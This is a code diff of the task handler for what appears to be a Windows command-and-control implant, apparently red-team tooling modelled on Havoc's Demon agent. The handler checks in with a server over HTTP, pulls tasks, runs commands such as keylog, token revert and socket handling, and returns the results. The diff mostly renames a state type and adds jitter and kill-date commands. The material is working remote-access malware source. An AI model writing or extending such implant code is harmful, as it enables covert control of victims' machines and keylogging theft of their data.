@@ -2,7 +2,7 @@
 
 namespace Handler
 {
-    VOID HTTPInit(State::PState pState)
+    VOID HTTPInit(State::PSTATE pState)
     {
 		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
             pState->pProcs,
@@ -14,7 +14,7 @@ namespace Handler
         pState->hConnect = handlers.hConnect;
     }
 
-    VOID HTTPClose(State::PState pState)
+    VOID HTTPClose(State::PSTATE pState)
     {
         System::Http::WinHttpCloseHandles(
             pState->pProcs,
@@ -24,7 +24,7 @@ namespace Handler
         );
     }
 
-    std::wstring GetInitialInfoJSON(State::PState pState)
+    std::wstring GetInitialInfoJSON(State::PSTATE pState)
     {
         std::wstring wOS = L"windows";
         std::wstring wArch = L"";
@@ -79,7 +79,7 @@ namespace Handler
 
     // If success, gets the agent UUID. This value will be used for subsequent processes.
     BOOL CheckIn(
-        State::PState pState,
+        State::PSTATE pState,
         const std::wstring& wInfoJson
     ) {
         std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);
@@ -106,7 +106,7 @@ namespace Handler
         return TRUE;
     }
 
-    BOOL TaskGet(State::PState pState)
+    BOOL TaskGet(State::PSTATE pState)
     {
         std::wstring wHeader = L"X-UUID: " + pState->wUUID + L"\r\n";
 
@@ -133,7 +133,7 @@ namespace Handler
         return TRUE;
     }
 
-    BOOL TaskExecute(State::PState pState)
+    BOOL TaskExecute(State::PSTATE pState)
     {
         std::wstring task = pState->wTask;
 
@@ -211,6 +211,10 @@ namespace Handler
         {
             pState->wTaskResult = Task::Ip();
         }
+        else if (wcscmp(task.substr(0, 7).c_str(), L"jitter ") == 0)
+        {
+            pState->wTaskResult = Task::SleepSet(pState, task.substr(7, task.size()));
+        }
         else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
         {
             pState->wTaskResult = Task::KeyLog(task.substr(7, task.size()));
@@ -218,6 +222,10 @@ namespace Handler
         else if (wcscmp(task.c_str(), L"kill") == 0)
         {
             pState->wTaskResult = Task::Kill(pState);
+        }
+        else if (wcscmp(task.substr(0, 9).c_str(), L"killdate ") == 0)
+        {
+            pState->wTaskResult = Task::KillDateSet(pState, task.substr(9, task.size()));
         }
         else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
         {
@@ -378,7 +386,7 @@ namespace Handler
         }
         else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
         {
-            pState->wTaskResult = Task::Sleep(pState, task.substr(6, task.size()));
+            pState->wTaskResult = Task::SleepSet(pState, task.substr(6, task.size()));
         }
         else if (wcscmp(task.c_str(), L"token revert") == 0)
         {
@@ -426,7 +434,7 @@ namespace Handler
         return TRUE;
     }
 
-    BOOL TaskResultSend(State::PState pState)
+    BOOL TaskResultSend(State::PSTATE pState)
     {
         System::Http::WinHttpResponse resp;
 
@@ -486,7 +494,7 @@ namespace Handler
         return TRUE;
     }
 
-    BOOL Task(State::PState pState)
+    BOOL Task(State::PSTATE pState)
     {
         if (Handler::TaskGet(pState))
         {
@@ -498,7 +506,7 @@ namespace Handler
         return FALSE;
     }
 
-    BOOL SocketAccept(State::PState pState)
+    BOOL SocketAccept(State::PSTATE pState)
     {
         Socket::PSOCKET_DATA pSocket = NULL;
         Socket::PSOCKET_DATA pClientSocket  = NULL;
@@ -558,7 +566,7 @@ namespace Handler
 
     // Reference:
     // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/Socket.c#L281
-    BOOL SocketRead(State::PState pState)
+    BOOL SocketRead(State::PSTATE pState)
     {
         Socket::PSOCKET_DATA pSocket = NULL;
         PVOID newBuf = NULL;
@@ -608,24 +616,47 @@ namespace Handler
     }
 
     //
-    // BOOL SocketClose(State::PState pState)
+    // BOOL SocketClose(State::PSTATE pState)
     // {
 
     // }
 
     // Kill every dead/removed socket.
-    // BOOL SocketKill(State::PState pState)
+    // BOOL SocketKill(State::PSTATE pState)
     // {
 
     // }
 
-    BOOL Socket(State::PState pState)
+    BOOL Socket(State::PSTATE pState)
     {
         SocketAccept(pState);
         // SocketRead(pState);
         // SocketKill(pState);
 
         return TRUE;
+    }
+
+    BOOL IsKillDateReached(INT nKillDate)
+    {
+        SYSTEMTIME currentTime;
+        GetSystemTime(&currentTime);
+
+        // Convert the current time to timestamp.
+        FILETIME currentFileTime;
+        SystemTimeToFileTime(&currentTime, &currentFileTime);
+        ULARGE_INTEGER currentTimestamp;
+        currentTimestamp.LowPart = currentFileTime.dwLowDateTime;
+        currentTimestamp.HighPart = currentFileTime.dwHighDateTime;
+        INT currentTimestampSeconds = currentTimestamp.QuadPart / 10000000 - 11644473600;
+
+        if (currentTimestampSeconds >= nKillDate)
+        {
+            return TRUE;
+        }
+        else
+        {
+            return FALSE;
+        }
     }
 }
 
